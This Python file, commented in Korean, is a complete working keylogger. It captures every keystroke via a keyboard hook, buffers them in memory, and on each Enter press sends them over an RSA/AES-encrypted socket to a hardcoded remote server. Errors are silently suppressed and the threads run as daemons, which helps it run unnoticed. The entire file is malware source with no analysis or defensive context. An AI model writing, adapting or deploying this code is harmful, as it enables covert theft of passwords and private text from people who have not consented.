import socket
import time
import threading
from queue import Queue
from pynput import keyboard
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# 서버 정보
SERVER_IP = "172.25.80.175"
SERVER_PORT = 12345
BUFFER_SIZE = 1024

# AES 대칭키
aes_key = None

# 메모리 내 로그 저장용 큐
log_queue = Queue()

# 엔터키 감지 이벤트
send_logs_event = threading.Event()

# AES 암호화 함수
def encrypt_message(message: bytes) -> bytes:
    iv = get_random_bytes(16)
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return iv + encryptor.update(message) + encryptor.finalize()

# 키보드 입력을 로그 큐에 기록하는 함수
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            log_queue.put(key.char)  # 키 문자만 저장
        else:
            special_key = str(key).replace("Key.", "").capitalize()
            if special_key == "Space":
                log_queue.put(" ")  # [Space]를 공백으로 대체
            elif special_key == "Tab":
                log_queue.put("\t")  # [Tab]을 탭 문자로 대체
            elif special_key == "Enter":
                send_logs_event.set()  # [Enter]는 제거하고 전송 이벤트 트리거
            else:
                log_queue.put(f"[{special_key}]")  # 기타 특수 키 저장
    except Exception:
        pass

# 서버로 로그 데이터를 전송하는 함수
def send_log_to_server():
    global aes_key
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((SERVER_IP, SERVER_PORT))

            # 서버로부터 RSA 공개키 수신
            public_key_data = client_socket.recv(450)
            server_public_key = RSA.import_key(public_key_data)

            # AES 대칭키 생성 및 RSA 암호화 후 전송
            aes_key = get_random_bytes(32)
            cipher_rsa = PKCS1_OAEP.new(server_public_key)
            encrypted_aes_key = cipher_rsa.encrypt(aes_key)
            client_socket.sendall(encrypted_aes_key)

            # 로그 데이터 전송
            while True:
                send_logs_event.wait()

                logs_to_send = []
                while not log_queue.empty():
                    logs_to_send.append(log_queue.get())

                if logs_to_send:
                    log_data = f"Logged Key: {''.join(logs_to_send)}"
                    encrypted_data = encrypt_message(log_data.encode("utf-8"))
                    client_socket.sendall(encrypted_data)

                send_logs_event.clear()
    except Exception:
        pass

# 키보드 후킹 시작
def start_keyboard_hook():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    # 키 후킹 스레드 시작
    threading.Thread(target=start_keyboard_hook, daemon=True).start()

    # 로그 전송 스레드 시작
    threading.Thread(target=send_log_to_server, daemon=True).start()

    # 메인 스레드 유지
    while True:
        time.sleep(1)
